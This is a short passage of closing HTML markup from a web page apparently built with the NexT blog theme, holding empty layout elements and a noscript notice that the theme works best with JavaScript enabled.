    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="reading-progress-bar"></div>
  <a role="button" class="book-mark-link book-mark-link-fixed"></a>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>

</body>
</html>
